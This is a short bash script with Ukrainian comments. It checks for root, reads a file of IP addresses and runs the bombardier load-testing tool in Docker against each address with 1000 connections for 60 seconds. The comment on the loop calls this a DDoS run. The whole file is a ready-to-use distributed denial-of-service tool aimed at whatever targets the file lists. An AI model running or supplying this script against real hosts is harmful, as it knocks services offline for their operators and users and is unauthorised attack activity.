#!/bin/bash

#Перевіряємо чи ми запускаємося від root користувача
if [ `id -u` -ne 0 ]; then
    echo "You must running this script for ROOT user!";
    exit;
fi
#Перевіряємо існування файлу з IP

if [ -z "$1" ]; then
    echo "Enter a file name with IP addresses!";
    exit;
elif [ ! -f $1 ]; then
    echo "File $1 does  not exist!";
    exit;
fi

#Запуск циклу по DDOS-у
while IFS= read -r line; do
    docker run --rm alpine/bombardier -c 1000 -d 60s -l $line
done < "$1"
